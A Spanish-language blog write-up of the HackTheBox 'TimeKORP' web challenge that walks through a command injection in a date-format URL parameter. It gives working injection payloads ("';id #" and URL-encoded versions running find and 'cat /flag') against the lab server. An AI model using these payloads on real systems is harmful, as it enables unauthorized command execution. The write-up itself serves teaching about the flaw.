+++ 
draft = false
date = 2026-04-02T18:08:15Z
title = "TimeKorp Web Challenge - HackTheBox"
description = "Este es challenge se toca la vulnerabilidad Command Injection"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-------------------------
- Tags: #Challenge #VeryEasy #CommandInjection 
----------------

# Introducción

En este writeup detallaremos la resolución del reto `TimeKORP` de la plataforma HackTheBox. Este laboratorio es un excelente ejemplo práctico para entender las vulnerabilidades de `Inyección de Comandos` (`Command Injection`) y cómo la falta de sanitización en el `input` del usuario puede comprometer un servidor por completo.

Durante la fase de reconocimiento, nos enfrentaremos a una aplicación web que interactúa directamente con el sistema operativo para formatear la fecha y hora. A través del análisis de los parámetros de la URL, descubriremos cómo el backend concatena nuestra entrada dentro del comando `date` de Linux.

El objetivo de este documento es mostrar el paso a paso de cómo identificar el punto de inyección, entender el código que corre en el servidor para lograr "escapar" de su contexto, y la importancia del `URL-Encoding` para enviar nuestros `payloads` correctamente, logrando finalmente la `Ejecución Remota de Código` (`RCE`) para localizar y exfiltrar la `flag`.
# Solución

Empezamos el desafío con la IP que nos proporciona `HackTheBox`, la cual es `154.57.164.83:32209`.

Al entrar a la IP nos encontramos con la siguiente página web

<img src="/images/Pasted image 20260402142319.png" style="width:100%; height:auto; display:block; margin:auto;">

Al entrar lo primero que llama la atención son los parámetros de la URL `/?format=%H:%M:%S`

Probamos insertar texto en la URL para ver el resultado, y vemos que se refleja lo que escribimos

<img src="/images/Pasted image 20260402142449.png" style="width:100%; height:auto; display:block; margin:auto;">

## Command Injection

Viendo como responde la web, probablemente el servidor esté ejecutando el siguiente comando

```bash
date '+ Its %H:%M:%S'
```

Dando como resultado lo que vemos en la web, como se aprecia en el siguiente ejemplo

<img src="/images/Pasted image 20260402143109.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora si borramos todos los parámetros tendríamos lo siguiente

<img src="/images/Pasted image 20260402143240.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto sabemos que nuestro input se encuentra acá

```bash
date '+ Its {input}'
```

Para poder inyectar comandos debemos cerrar la comilla, y luego podemos comentar todo con un `#` para evitar errores.

```bash
date '+ Its ';id #'
```

Quedando de la siguiente manera

<img src="/images/Pasted image 20260402143439.png" style="width:100%; height:auto; display:block; margin:auto;">

Por  lo tanto el parámetro de URL que mandaremos será el siguiente

```bash
/?format=';id #
```

Al mandarlo vemos que no nos muestra nada

<img src="/images/Pasted image 20260402143536.png" style="width:100%; height:auto; display:block; margin:auto;">

Esto se debe a que no hemos realizado un `URL-Encode`

Por tanto realizamos la transformación con el `Decoder` de `Burpsuite`

<img src="/images/Pasted image 20260402143650.png" style="width:100%; height:auto; display:block; margin:auto;">

Quedando finalmente nuestro parámetro de URL así

```bash
/?format=%27%3b%69%64%20%23
```

Vemos que ahora la web si interpreta nuestro comando `id`

<img src="/images/Pasted image 20260402143746.png" style="width:100%; height:auto; display:block; margin:auto;">

**NOTA:** Otros payloads que también funcionarían serían los siguientes, con su respectivo `URL-Encoded`

```bash
' | id #
';ls'
```

## Obteniendo la flag

Ya sabiendo como inyectar comandos en la web, es sencillo poder leer la flag, para ello primero debemos encontrar la ruta de este, la cual podemos obtener con el comando `find`, de la siguiente forma

```bash
find / -name *flag* 2>/dev/null
```

Integrado a nuestro payload y `URL-Encoded` quedarías así

```bash
%27%3b%66%69%6e%64%20%2f%20%2d%6e%61%6d%65%20%2a%66%6c%61%67%2a%20%32%3e%2f%64%65%76%2f%6e%75%6c%6c%20%23
```

Encontrando la ruta `/flag`

<img src="/images/Pasted image 20260402144110.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora solo necesitaríamos leer con `cat`, de la siguiente forma

```bash
cat /flag
```

Integrado a nuestro payload y `URL-Encoded` quedarías así

```bash
%27%3b%63%61%74%20%2f%66%6c%61%67%20%23
```

Así encontramos la `flag` y terminamos el `challenge`

<img src="/images/Pasted image 20260402144222.png" style="width:100%; height:auto; display:block; margin:auto;">
